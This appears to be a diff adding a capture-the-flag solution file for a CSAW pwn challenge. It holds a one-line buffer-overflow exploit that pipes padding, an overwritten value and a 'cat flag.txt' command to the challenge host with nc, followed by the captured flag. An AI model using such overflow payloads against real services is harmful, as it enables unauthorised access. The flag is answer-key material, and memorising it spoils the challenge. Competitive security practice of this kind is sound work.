@@ -1,0 +1,3 @@
+python -c "print 'AAAAAAAAAAAAAAAAAAAA\xee\xba\xf3\xca cat flag.txt'" | nc pwn.chal.csaw.io 9000
+
+flag{Y0u_Arrre_th3_Bi66Est_of_boiiiiis}
